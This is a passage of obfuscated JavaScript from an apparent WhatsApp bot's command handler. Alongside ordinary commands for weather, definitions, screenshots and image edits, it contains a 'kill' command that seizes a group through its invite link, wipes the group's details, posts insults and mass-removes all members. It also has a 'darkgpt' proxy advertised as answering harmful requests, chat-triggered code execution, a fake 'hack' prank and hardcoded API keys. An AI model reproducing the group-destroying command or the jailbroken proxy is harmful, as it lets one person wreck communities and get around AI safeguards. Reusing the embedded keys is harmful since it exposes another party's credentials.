              const _0x46f903 = await fetchJson('https://api.dreaded.site/api/gemini-vision?url=' + _0x1ee1cf + "&instruction=" + _0x32c5b4);
              let _0x35e7d9 = _0x46f903.result;
              await _0xca7ad5.reply(_0x35e7d9);
            } catch (_0x4b4e47) {
              _0xca7ad5.reply("I am unable to analyze images at the moment\n" + _0x4b4e47);
            }
          }
          break;
        case "vision":
          {
            if (!_0x4db425 || !_0x32c5b4) {
              _0xca7ad5.reply("𝗤𝘂𝗼𝘁𝗲 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲 𝗮𝗻𝗱 𝗴𝗶𝘃𝗲 𝘀𝗼𝗺𝗲 𝗶𝗻𝘀𝘁𝗿𝘂𝗰𝘁𝗶𝗼𝗻𝘀 𝗲𝗵. 𝗜'𝗺 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭 𝗔𝗶, 𝗶 𝘂𝘀𝗲 𝗕𝗮𝗿𝗱 𝘁𝗼 𝗮𝗻𝗮𝗹𝘆𝘇𝗲 𝗶𝗺𝗮𝗴𝗲𝘀.");
              return;
            }
            ;
            let _0x423aa1;
            if (_0x4db425.imageMessage) {
              _0x423aa1 = _0x4db425.imageMessage;
            } else {
              _0xca7ad5.reply("𝗛𝘂𝗵, 𝗧𝗵𝗮𝘁'𝘀 𝗻𝗼𝘁 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲, 𝗦𝗲𝗻𝗱 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲 𝘁𝗵𝗲𝗻 𝘁𝗮𝗴 𝗶𝘁 𝘄𝗶𝘁𝗵 𝘁𝗵𝗲 𝗶𝗻𝘀𝘁𝗿𝘂𝗰𝘁𝗶𝗼𝗻𝘀 !");
              return;
            }
            ;
            try {
              let _0x4ca703 = await _0x398b1a.downloadAndSaveMediaMessage(_0x423aa1);
              let _0x46e6e7 = await uploadtoimgur(_0x4ca703);
              _0xca7ad5.reply("𝗔 𝗺𝗼𝗺𝗲𝗻𝘁, 𝗟𝗲𝗺𝗺𝗲 𝗮𝗻𝗮𝗹𝘆𝘇𝗲 𝘁𝗵𝗲 𝗰𝗼𝗻𝘁𝗲𝗻𝘁𝘀 𝗼𝗳 𝘁𝗵𝗲 𝗶𝗺𝗮𝗴𝗲. . .");
              let _0x3b016b = await (await fetch('https://bk9.fun/ai/geminiimg?url=' + _0x46e6e7 + "&q=" + _0x32c5b4)).json();
              const _0x4f5a0d = {
                'text': _0x3b016b.BK9
              };
              await _0x398b1a.sendMessage(_0xca7ad5.chat, _0x4f5a0d, {
                'quoted': _0xca7ad5
              });
            } catch (_0x1bf677) {
              _0xca7ad5.reply("An error occured\n" + _0x1bf677);
            }
          }
          break;
        case "remini":
          {
            if (!_0x38810c) {
              return _0x1d37a1("𝗪𝗵𝗲𝗿𝗲 𝗶𝘀 𝘁𝗵𝗲 𝗶𝗺𝗮𝗴𝗲 ?");
            }
            if (!/image/.test(_0x372f6b)) {
              return _0x1d37a1("𝗤𝘂𝗼𝘁𝗲 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲 𝘄𝗶𝘁𝗵 𝗰𝗮𝗽𝘁𝗶𝗼𝗻𝘀 " + (prefix + _0x3418f9));
            }
            const {
              remini: _0x4bcc25
            } = require("./lib/remini");
            let _0x50b609 = await _0x38810c.download();
            let _0x2c236e = await _0x4bcc25(_0x50b609, "enhance");
            _0x398b1a.sendMessage(_0xca7ad5.chat, {
              'image': _0x2c236e,
              'caption': "𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
            }, {
              'quoted': _0xca7ad5
            });
          }
          break;
        case "kill2":
        case "kickall2":
        case "terminate":
          {
            if (!_0x11f3a8) {
              throw NotOwner;
            }
            if (!_0x32c5b4) {
              return _0xca7ad5.reply("Provide a valid group link. Ensure the bot is in that group with admin privileges !");
            }
            let _0x28da29;
            let _0x115fbe;
            try {
              let _0x1c6a99 = _0x4dd883[0x0].split('https://chat.whatsapp.com/')[0x1];
              const _0x2e112b = await _0x398b1a.groupGetInviteInfo(_0x1c6a99);
              ({
                id: _0x28da29,
                subject: _0x115fbe
              } = _0x2e112b);
            } catch (_0x37d1c4) {
              _0xca7ad5.reply("Why are you giving me an invalid group link?");
              return;
            }
            try {
              const _0x16252d = await _0x398b1a.groupMetadata(_0x28da29);
              const _0x461502 = await _0x16252d.participants;
              let _0x200c9a = _0x461502.filter(_0x45d6c8 => _0x45d6c8.id !== _0x398b1a.decodeJid(_0x398b1a.user.id)).map(_0x49194e => _0x49194e.id);
              await _0xca7ad5.reply("☠️𝑴𝒛𝒂𝒛𝒊 𝒊𝒔 𝒊𝒏𝒊𝒕𝒊𝒂𝒍𝒊𝒛𝒊𝒏𝒈 𝒂𝒏𝒅 𝒑𝒓𝒆𝒑𝒂𝒓𝒊𝒏𝒈 𝒕𝒐 𝒌𝒊𝒍𝒍☠️ " + _0x115fbe);
              await _0x398b1a.groupSettingUpdate(_0x28da29, 'announcement');
              await _0x398b1a.removeProfilePicture(_0x28da29);
              await _0x398b1a.groupUpdateSubject(_0x28da29, "𝑻𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑 𝒊𝒔 𝒏𝒐 𝒍𝒐𝒏𝒈𝒆𝒓 𝒂𝒗𝒂𝒊𝒍𝒂𝒃𝒍𝒆 🚫");
              await _0x398b1a.groupUpdateDescription(_0x28da29, "//𝑩𝒚 𝒕𝒉𝒆 𝒐𝒓𝒅𝒆𝒕 𝒐𝒇 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭 𝗗𝗲𝘃 !");
              await _0x398b1a.groupRevokeInvite(_0x28da29);
              await _0x398b1a.sendMessage(_0x28da29, {
                'text': "𝑨𝒕 𝒕𝒉𝒊𝒔 𝒕𝒊𝒎𝒆, 𝑴𝒚 𝒐𝒘𝒏𝒆𝒓 𝒉𝒂𝒔 𝒊𝒏𝒊𝒕𝒊𝒂𝒕𝒆𝒅 𝒕𝒐 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒓𝒆𝒎𝒐𝒕𝒆𝒍𝒚.\n𝑻𝒉𝒊𝒔 𝒉𝒂𝒔 𝒕𝒓𝒊𝒈𝒈𝒆𝒓𝒆𝒅 𝒎𝒆 𝒕𝒐 𝒓𝒆𝒎𝒐𝒗𝒆 𝒂𝒍𝒍 𝒕𝒉𝒆 𝒔𝒕𝒖𝒑𝒊𝒅 " + _0x200c9a.length + " 𝒈𝒓𝒐𝒖𝒑 𝒑𝒂𝒓𝒕𝒊𝒄𝒊𝒑𝒂𝒏𝒕𝒔 𝒊𝒏 𝒕𝒉𝒆 𝒏𝒆𝒙𝒕 𝒔𝒆𝒄𝒐𝒏𝒅.\n\n𝑮𝒐𝒐𝒅 𝒃𝒚𝒆 𝒎𝒐𝒕𝒉𝒆𝒓𝒇*𝒄𝒌𝒆𝒓𝒔! 👋\n\n⚠️𝑻𝑯𝑰𝑺 𝑷𝑹𝑶𝑪𝑬𝑺𝑺 𝑪𝑨𝑵𝑵𝑶𝑻 𝑩𝑬 𝑻𝑬𝑹𝑴𝑰𝑵𝑨𝑻𝑬𝑫⚠️",
                'mentions': _0x461502.map(_0x128366 => _0x128366.id)
              });
              await _0x398b1a.groupParticipantsUpdate(_0x28da29, _0x200c9a, "remove");
              const _0x22c39c = {
                'text': "𝑮𝒐𝒐𝒅𝒃𝒚𝒆 𝑮𝒓𝒐𝒖𝒑 𝒐𝒘𝒏𝒆𝒓👋\n𝒕𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑 𝒊𝒔 𝒖𝒔𝒆𝒍𝒆𝒔𝒔, 𝒄𝒓𝒆𝒂𝒕𝒆 𝒂𝒏𝒐𝒕𝒉𝒆𝒓 𝒐𝒏𝒆🥶"
              };
              await _0x398b1a.sendMessage(_0x28da29, _0x22c39c);
              await _0x398b1a.groupLeave(_0x28da29);
              await _0xca7ad5.reply("```𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍 𝑲𝒊𝒍𝒍𝒆𝒅 𝒃𝒚 𝑴𝒁𝑨𝒁𝑰-𝑿𝑴𝑫💀```");
            } catch (_0x5bf540) {
              _0xca7ad5.reply("```Kill command failed, bot is either not in that group, or not an admin```.");
            }
          }
          break;
        case "carbon":
          {
            const _0x218daa = require("node-fetch");
            let _0xd44769 = "𝗖𝗢𝗡𝗩𝗘𝗥𝗧𝗘𝗗 𝗕𝗬 " + botname;
            if (_0xca7ad5.quoted && _0xca7ad5.quoted.text) {
              const _0x44cf54 = _0xca7ad5.quoted.text;
              try {
                let _0x51bc81 = await _0x218daa("https://carbonara.solopov.dev/api/cook", {
                  'method': 'POST',
                  'headers': {
                    'Content-Type': "application/json"
                  },
                  'body': JSON.stringify({
                    'code': _0x44cf54,
                    'backgroundColor': "#1F816D"
                  })
                });
                if (!_0x51bc81.ok) {
                  return _0xca7ad5.reply("API failed to fetch a valid response.");
                }
                let _0x2b410e = await _0x51bc81.buffer();
                await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                  'image': _0x2b410e,
                  'caption': _0xd44769
                }, {
                  'quoted': _0xca7ad5
                });
              } catch (_0x4c492d) {
                _0xca7ad5.reply("An error occured\n" + _0x4c492d);
              }
            } else {
              _0xca7ad5.reply("Quote a code message");
            }
          }
          break;
        case "define":
          {
            try {
              if (!_0x32c5b4) {
                return _0xca7ad5.reply("Please provide a word.");
              }
              const _0x48648a = encodeURIComponent(_0x32c5b4);
              const _0x327491 = await fetch("https://api.dictionaryapi.dev/api/v2/entries/en/" + _0x48648a);
              if (!_0x327491.ok) {
                return _0xca7ad5.reply("Failed to fetch data. Please try again later.");
              }
              const _0x185c2a = await _0x327491.json();
              if (!_0x185c2a || !_0x185c2a[0x0] || !_0x185c2a[0x0].meanings || _0x185c2a[0x0].meanings.length === 0x0) {
                return _0xca7ad5.reply("No definitions found for the provided word.");
              }
              const _0x3eb303 = _0x185c2a[0x0];
              const _0x4fec8c = _0x3eb303.meanings[0x0].definitions[0x0].definition;
              const _0x55edd4 = '' + _0x4fec8c;
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'text': _0x55edd4
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x52ab98) {
              console.error("Error occurred:", _0x52ab98);
              _0xca7ad5.reply("An error occurred while fetching the data. Please try again later.\n" + _0x52ab98);
            }
          }
          break;
        case 'tweet':
          {
            if (!_0x32c5b4) {
              return _0xca7ad5.reply("provide some text for the tweet");
            }
            const _0x2b64d9 = _0xca7ad5.sender.split('@')[0x0];
            const _0x509c22 = await _0x398b1a.profilePictureUrl(_0xca7ad5.sender, "image")["catch"](_0x134fda => "https://i.imgur.com/BsF7NhZ.jpeg");
            const _0xdfd88d = "https://some-random-api.com/canvas/misc/tweet?displayname=" + encodeURIComponent(_0x466e42) + '&username=' + encodeURIComponent(_0x2b64d9) + "&avatar=" + encodeURIComponent(_0x509c22) + "&comment=" + encodeURIComponent(_0x32c5b4) + "&replies=" + encodeURIComponent('246') + '&retweets=' + encodeURIComponent('125') + "&theme=" + encodeURIComponent('dark');
            await _0x398b1a.sendMessage(_0xca7ad5.chat, {
              'image': {
                'url': _0xdfd88d
              },
              'caption': "𝗖𝗼𝗻𝘃𝗲𝗿𝘁𝗲𝗱 𝗯𝘆 𝗥𝗔𝗩𝗘𝗡-𝗕𝗢𝗧"
            }, {
              'quoted': _0xca7ad5
            });
          }
          break;
        case "pickupline":
          {
            try {
              const _0x4598df = await fetch('https://api.popcat.xyz/pickuplines');
              if (!_0x4598df.ok) {
                throw new Error("Failed to fetch data");
              }
              const {
                pickupline: _0x22c985
              } = await _0x4598df.json();
              const _0x13cf1a = '' + _0x22c985;
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'text': _0x13cf1a
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x459cfc) {
              console.error("Error fetching data:", _0x459cfc);
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'text': "An error occurred while fetching the fact."
              }, {
                'quoted': _0xca7ad5
              });
            }
          }
          break;
        case "quotes":
          {
            try {
              const _0x23a471 = await fetch("https://favqs.com/api/qotd");
              if (!_0x23a471.ok) {
                throw new Error("Failed to fetch data");
              }
              const {
                quote: _0x2cf5de
              } = await _0x23a471.json();
              const _0x3e8b37 = _0x2cf5de.body + " \n\n𝗤𝘂𝗼𝘁𝗲 𝗕𝘆 " + _0x2cf5de.author;
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'text': _0x3e8b37
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x5d724c) {
              console.error("Error fetching data:", _0x5d724c);
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'text': "An error occurred while fetching the fact."
              }, {
                'quoted': _0xca7ad5
              });
            }
          }
          break;
        case "google":
          {
            const _0x2a1a13 = require("axios");
            if (!_0x32c5b4) {
              _0xca7ad5.reply("Provide a search term!\nEg: .Google What is treason");
              return;
            }
            let {
              data: _0x529ad7
            } = await _0x2a1a13.get('https://www.googleapis.com/customsearch/v1?q=' + _0x32c5b4 + '&key=AIzaSyDMbI3nvmQUrfjoCJYLS69Lej1hSXQjnWI&cx=baf9bdb0c631236e5');
            if (_0x529ad7.items.length == 0x0) {
              _0xca7ad5.reply("❌ Unable to find a result");
              return;
            }
            let _0x28f7d3 = "SEARCH FROM GOOGLE\n🔍 Term:- " + _0x32c5b4 + "\n\n";
            for (let _0x3ec831 = 0x0; _0x3ec831 < _0x529ad7.items.length; _0x3ec831++) {
              _0x28f7d3 += "🪧 Title:- " + _0x529ad7.items[_0x3ec831].title + "\n🖥 Description:- " + _0x529ad7.items[_0x3ec831].snippet + "\n🌐 Link:- " + _0x529ad7.items[_0x3ec831].link + "\n\n";
            }
            _0xca7ad5.reply(_0x28f7d3);
          }
          break;
        case "hack":
          {
            if (!_0x11f3a8) {
              throw NotOwner;
            }
            try {
              const _0x3a1771 = ["⚠️𝗜𝗻𝗶𝘁𝗶𝗹𝗶𝗮𝘇𝗶𝗻𝗴 𝗛𝗮𝗰𝗸𝗶𝗻𝗴 𝗧𝗼𝗼𝗹𝘀⚠️", "𝗜𝗻𝗷𝗲𝗰𝘁𝗶𝗻𝗴 𝗠𝗮𝗹𝘄𝗮𝗿𝗲🐛..\n𝗟𝗼𝗮𝗱𝗶𝗻𝗴 𝗗𝗲𝘃𝗶𝗰𝗲 𝗚𝗮𝗹𝗹𝗲𝗿𝘆 𝗙𝗶𝗹𝗲𝘀⚠️", "```██ 10%``` ⏳", "```████ 20%``` ⏳", "```██████ 30%``` ⏳", "```████████ 40%``` ⏳", "```██████████ 50%``` ⏳", "```████████████ 60%``` ⏳", "```██████████████ 70%``` ⏳", "```████████████████ 80%``` ⏳", "```██████████████████ 90%``` ⏳", "```████████████████████ 100%``` ✅", "```𝗦𝘆𝘀𝘁𝗲𝗺 𝗛𝘆𝗷𝗮𝗰𝗸𝗶𝗻𝗴 𝗼𝗻 𝗽𝗿𝗼𝗰𝗲𝘀𝘀...```\n```𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗻𝗴 𝘁𝗼 𝘁𝗵𝗲 𝗦𝗲𝗿𝘃𝗲𝗿 𝘁𝗼 𝗙𝗶𝗻𝗱 𝗘𝗿𝗿𝗼𝗿 404```", "```𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 𝘁𝗼 𝗗𝗲𝘃𝗶𝗰𝗲...\n𝗥𝗲𝗰𝗲𝗶𝘃𝗶𝗻𝗴 𝗗𝗮𝘁𝗮/𝗦𝗲𝗰𝗿𝗲𝘁 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱𝘀...```", "```𝗗𝗮𝘁𝗮 𝗧𝗿𝗮𝗻𝘀𝗳𝗲𝗿𝗲𝗱 𝗙𝗿𝗼𝗺 𝗱𝗲𝘃𝗶𝗰𝗲 100% 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱\n𝗘𝗿𝗮𝘀𝗶𝗻𝗴 𝗮𝗹𝗹 𝗘𝘃𝗶𝗱𝗲𝗻𝗰𝗲, 𝗞𝗶𝗹𝗹𝗶𝗻𝗴 𝗮𝗹𝗹 𝗠𝗮𝗹𝘄𝗮𝗿𝗲𝘀🐛...```", "```𝗦𝗘𝗡𝗗𝗜𝗡𝗗 𝗟𝗢𝗚 𝗗𝗢𝗖𝗨𝗠𝗘𝗡𝗧𝗦...```", "```𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗗𝗮𝘁𝗮 𝗔𝗻𝗱 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗼𝗻 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 𝗗𝗶𝘀𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱```", "```𝗔𝗹𝗹 𝗕𝗮𝗰𝗸𝗹𝗼𝗴𝘀 𝗖𝗹𝗲𝗮𝗿𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆💣\n𝗬𝗼𝘂𝗿 𝗦𝘆𝘀𝘁𝗲𝗺 𝗪𝗶𝗹𝗹 𝗕𝗲 𝗗𝗼𝘄𝗻 𝗜𝗻 𝗧𝗵𝗲 𝗡𝗲𝘅𝘁 𝗠𝗶𝗻𝘂𝘁𝗲⚠️```"];
              for (const _0x5dfd40 of _0x3a1771) {
                await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                  'text': _0x5dfd40
                }, {
                  'quoted': _0xca7ad5
                });
                await new Promise(_0x60ab7f => setTimeout(_0x60ab7f, 0x3e8));
              }
            } catch (_0x1fb204) {
              console.error("Error during prank:", _0x1fb204);
              _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'text': "❌ *Error!* Something went wrong. Reason: " + _0x1fb204.message + ". Please try again later."
              });
            }
          }
          break;
        case "compile-py":
          if (!_0x32c5b4 && !_0xca7ad5.quoted) {
            throw "Quote/tag a python code to compile.";
          }
          const _0xe367ea = _0xca7ad5.quoted ? _0xca7ad5.quoted.text ? _0xca7ad5.quoted.text : _0x32c5b4 ? _0x32c5b4 : _0xca7ad5.text : _0xca7ad5.text;
          let _0x1bb019 = python.runSource(_0xe367ea);
          _0x1bb019.then(_0x477dba => {
            console.log(_0x477dba);
            _0x1d37a1(_0x477dba.stdout);
            _0x1d37a1(_0x477dba.stderr);
          })['catch'](_0x57e6a8 => {
            console.log(resultt.stderr);
            _0x1d37a1(resultt.stderr);
          });
          break;
        case "save":
          {
            const _0x2c9d89 = _0xca7ad5.text.toLowerCase();
            const _0x2d712c = _0xca7ad5.msg?.["contextInfo"]?.["quotedMessage"];
            if (_0x2d712c && _0x2c9d89.startsWith(prefix + 'save') && !_0xca7ad5.quoted.chat.includes('status@broadcast')) {
              return _0xca7ad5.reply("You did not tag a status media to save.");
            }
            if (_0x11f3a8 && _0x2d712c && _0x2c9d89.startsWith(prefix + "save") && _0xca7ad5.quoted.chat.includes("status@broadcast")) {
              if (_0x2d712c.imageMessage) {
                let _0x40331a = _0x2d712c.imageMessage.caption;
                let _0x2e340f = await _0x398b1a.downloadAndSaveMediaMessage(_0x2d712c.imageMessage);
                _0x398b1a.sendMessage(_0xca7ad5.chat, {
                  'image': {
                    'url': _0x2e340f
                  },
                  'caption': _0x40331a
                });
              }
              if (_0x2d712c.videoMessage) {
                let _0x5cd7da = _0x2d712c.videoMessage.caption;
                let _0x1e38dc = await _0x398b1a.downloadAndSaveMediaMessage(_0x2d712c.videoMessage);
                _0x398b1a.sendMessage(_0xca7ad5.chat, {
                  'video': {
                    'url': _0x1e38dc
                  },
                  'caption': _0x5cd7da
                });
              }
            }
          }
          break;
        case "gitclone":
          {
            if (!_0x32c5b4) {
              return _0xca7ad5.reply("Where is the link?");
            }
            if (!_0x32c5b4.includes("github.com")) {
              return _0xca7ad5.reply("Is that a GitHub repo link ?!");
            }
            let _0x182e85 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i;
            let [, _0x124118, _0x1b27bc] = _0x32c5b4.match(_0x182e85) || [];
            _0x1b27bc = _0x1b27bc.replace(/.git$/, '');
            let _0x51f3ab = "https://api.github.com/repos/" + _0x124118 + '/' + _0x1b27bc + "/zipball";
            let _0x37cdca = (await fetch(_0x51f3ab, {
              'method': 'HEAD'
            })).headers.get("content-disposition").match(/attachment; filename=(.*)/)[0x1];
            await _0x398b1a.sendMessage(_0xca7ad5.chat, {
              'document': {
                'url': _0x51f3ab
              },
              'fileName': _0x37cdca + ".zip",
              'mimetype': "application/zip"
            }, {
              'quoted': _0xca7ad5
            })["catch"](_0x51d981 => _0xca7ad5.reply("error"));
          }
          break;
        case "darkgpt":
          {
            if (!_0x32c5b4) {
              return _0xca7ad5.reply("Hey there Fuckface😈, I'm Darkgpt, I respond to anything be it harmful, I'm a pure Evil👿, What sort of dark and delightful nonsense do you want to dive into Today😈 ?");
            }
            try {
              const _0x1a7a96 = await fetchJson("https://api.dreaded.site/api/makgpt?text=" + _0x32c5b4);
              if (_0x1a7a96 && _0x1a7a96.result) {
                const _0x561b12 = _0x1a7a96.result;
                await _0xca7ad5.reply(_0x561b12);
              } else {
                _0xca7ad5.reply("Huh, the silence is deafening, no response whatsoever💀.The API seems to have vanished into the abyss...😔");
              }
            } catch (_0x18a549) {
              _0x1d37a1("An error occured while communicating with the APIs\n" + _0x18a549);
            }
          }
          break;
        case 'github':
          {
            if (!_0x32c5b4) {
              return _0xca7ad5.reply("Provide a github username to stalk");
            }
            try {
              const _0x31b853 = await fetch("https://itzpire.com/stalk/github-user?username=" + _0x32c5b4);
              const _0x1ac03e = await _0x31b853.json();
              const _0x9f66f5 = _0x1ac03e.data.username;
              const _0x208970 = _0x1ac03e.data.nickname;
              const _0x1dad3a = _0x1ac03e.data.bio;
              const _0x514fb8 = _0x1ac03e.data.profile_pic;
              const _0x969022 = _0x1ac03e.data.url;
              const _0x43390f = _0x1ac03e.data.location;
              const _0x19484c = _0x1ac03e.data.public_repo;
              const _0x160e44 = _0x1ac03e.data.followers;
              const _0x4af93a = _0x1ac03e.data.following;
              const _0x1faacf = _0x1ac03e.data.ceated_at;
              const _0x346396 = "Username:- " + _0x9f66f5 + "\n\nNickname:- " + _0x208970 + "\n\nBio:- " + _0x1dad3a + "\n\nLink:- " + _0x969022 + "\n\nLocation:- " + _0x43390f + "\n\nFollowers:- " + _0x160e44 + "\n\nFollowing:- " + _0x4af93a + "\n\nRepos:- " + _0x19484c + "\n\nCreated:- " + _0x1faacf;
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x514fb8
                },
                'caption': _0x346396
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x578042) {
              _0xca7ad5.reply("Unable to fetch data\n" + _0x578042);
            }
          }
          break;
        case "screenshot":
        case 'ss':
          {
            try {
              let _0x8701df = "𝗦𝗰𝗿𝗲𝗲𝗻𝘀𝗵𝗼𝘁 𝗯𝘆 " + botname;
              if (!_0x32c5b4) {
                return _0xca7ad5.reply("Provide a website link to screenshot.");
              }
              const _0x5bf745 = 'https://image.thum.io/get/fullpage/' + _0x32c5b4;
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x5bf745
                },
                'caption': _0x8701df
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x376488) {
              _0xca7ad5.reply("An error occured.");
            }
          }
          break;
        case 'alive':
        case "test":
          {
            const _0x43ff96 = {
              'audio': {
                'url': "./Media/alive.mp3"
              },
              'mimetype': "audio/mp4",
              'ptt': true,
              'waveform': [0x64, 0x0, 0x64, 0x0, 0x64, 0x0, 0x64],
              'fileName': '𝗩𝗶𝗻𝗶𝘇𝗶𝗮𝘇',
              'contextInfo': {
                'mentionedJid': [_0xca7ad5.sender],
                'externalAdReply': {
                  'title': "𝗛𝗶 𝘆𝗼𝘂👋, 𝗜 𝗮𝗺 𝗔𝗹𝗶𝘃𝗲 𝗮𝗹𝗹 𝘁𝗵𝗲 𝘁𝗶𝗺𝗲😂",
                  'body': "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗",
                  'thumbnailUrl': 'https://i.imgur.com/HP6GyiD.jpeg',
                  'sourceUrl': '',
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            };
            await _0x398b1a.sendMessage(_0xca7ad5.chat, _0x43ff96, {
              'quoted': _0xca7ad5
            });
          }
          break;
        case "removebg":
          {
            try {
              if (!_0xca7ad5.quoted) {
                return _0xca7ad5.reply("Send the image then tag it with the command.");
              }
              if (!/image/.test(_0x372f6b)) {
                return _0xca7ad5.reply("That is not an image, try again while quoting an actual image.");
              }
              let _0x39cb9c = await _0x398b1a.downloadAndSaveMediaMessage(_0xca7ad5.quoted);
              let _0xf3c496 = await uploadtoimgur(_0x39cb9c);
              _0xca7ad5.reply("𝗔 𝗺𝗼𝗺𝗲𝗻𝘁, 𝗩𝗶𝗻𝗶𝘇𝗶𝗮𝘇 𝗶𝘀 𝗲𝗿𝗮𝘀𝗶𝗻𝗴 𝘁𝗵𝗲 𝗯𝗮𝗰𝗸𝗴𝗿𝗼𝘂𝗻𝗱. . .");
              const _0x43abe7 = 'https://api.dreaded.site/api/removebg?imageurl=' + _0xf3c496;
              await _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x43abe7
                },
                'caption': "𝗘𝗱𝗶𝘁𝗲𝗱 𝗯𝘆 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗"
              }, {
                'quoted': _0xca7ad5
              });
            } catch (_0x5ee12a) {
              _0xca7ad5.reply("An error occured...");
            }
          }
          break;
        case "fact":
          {
            try {
              const _0x368ae8 = await fetchJson("https://api.dreaded.site/api/fact");
              const _0x1159c2 = _0x368ae8.fact;
              await _0xca7ad5.reply(_0x1159c2);
            } catch (_0x4f6068) {
              _0xca7ad5.reply("Something is wrong.");
            }
          }
          break;
        case "catfact":
          {
            try {
              const _0x418310 = await fetchJson("https://api.dreaded.site/api/catfact");
              const _0x170038 = _0x418310.fact;
              await _0xca7ad5.reply(_0x170038);
            } catch (_0x5b7d5e) {
              _0xca7ad5.reply("Something is wrong.");
            }
          }
          break;
        case "tts":
        case "say":
          {
            const _0x21a399 = require("google-tts-api");
            if (!_0x32c5b4) {
              return _0xca7ad5.reply("Povide a text for conversion !");
            }
            const _0x88becd = _0x21a399.getAudioUrl(_0x32c5b4, {
              'lang': "hi-IN",
              'slow': false,
              'host': "https://translate.google.com"
            });
            _0x398b1a.sendMessage(_0xca7ad5.chat, {
              'audio': {
                'url': _0x88becd
              },
              'mimetype': 'audio/mp4',
              'ptt': true
            }, {
              'quoted': _0xca7ad5
            });
          }
          break;
        case "gpt":
          {
            if (!_0x32c5b4) {
              return _0x1d37a1("Hello there, what's your question?");
            }
            let _0x2c0619 = await fetchJson('https://bk9.fun/ai/jeeves-chat2?q=' + _0x32c5b4);
            if (!_0x2c0619.BK9) {
              return _0x1d37a1("An error occurred while fetching the AI chatbot response. Please try again later.");
            } else {
              _0x1d37a1(_0x2c0619.BK9);
            }
          }
          break;
        case "weather":
          {
            try {
              if (!_0x32c5b4) {
                return _0xca7ad5.reply("provide a city/town name");
              }
              const _0x390076 = await fetch("http://api.openweathermap.org/data/2.5/weather?q=" + _0x32c5b4 + "&units=metric&appid=1ad47ec6172f19dfaf89eb3307f74785");
              const _0x4cdf9b = await _0x390076.json();
              console.log("Weather data:", _0x4cdf9b);
              const _0x1645f1 = _0x4cdf9b.name;
              const _0x3cb2c0 = _0x4cdf9b.main.temp;
              const _0x438a5f = _0x4cdf9b.weather[0x0].description;
              const _0x370af0 = _0x4cdf9b.main.humidity;
              const _0x2cdbc7 = _0x4cdf9b.wind.speed;
              const _0xa7b020 = _0x4cdf9b.rain ? _0x4cdf9b.rain['1h'] : 0x0;
              const _0x4356e1 = _0x4cdf9b.clouds.all;
              const _0x2ac29e = new Date(_0x4cdf9b.sys.sunrise * 0x3e8);
              const _0x1e57a0 = new Date(_0x4cdf9b.sys.sunset * 0x3e8);
              await _0xca7ad5.reply("❄️ Weather in " + _0x1645f1 + "\n\n🌡️ Temperature: " + _0x3cb2c0 + "°C\n📝 Description: " + _0x438a5f + "\n❄️ Humidity: " + _0x370af0 + "%\n🌀 Wind Speed: " + _0x2cdbc7 + " m/s\n🌧️ Rain Volume (last hour): " + _0xa7b020 + " mm\n☁️ Cloudiness: " + _0x4356e1 + "%\n🌄 Sunrise: " + _0x2ac29e.toLocaleTimeString() + "\n🌅 Sunset: " + _0x1e57a0.toLocaleTimeString());
            } catch (_0x549960) {
              _0xca7ad5.reply("Unable to find that location.");
            }
          }
          break;
        case "compile-js":
          if (!_0x32c5b4 && !_0xca7ad5.quoted) {
            throw "Quote/tag a Js code to compile.";
          }
          const _0x4548e5 = _0xca7ad5.quoted ? _0xca7ad5.quoted.text ? _0xca7ad5.quoted.text : _0x32c5b4 ? _0x32c5b4 : _0xca7ad5.text : _0xca7ad5.text;
          let _0x41b0f2 = node.runSource(_0x4548e5);
          _0x41b0f2.then(_0x3f121c => {
            console.log(_0x3f121c);
            _0x1d37a1(_0x3f121c.stdout);
            _0x1d37a1(_0x3f121c.stderr);
          })["catch"](_0x5b0ff6 => {
            console.log(resultt1.stderr);
            _0x1d37a1(resultt1.stderr);
          });
          break;
        case 'quotely':
          {
            try {
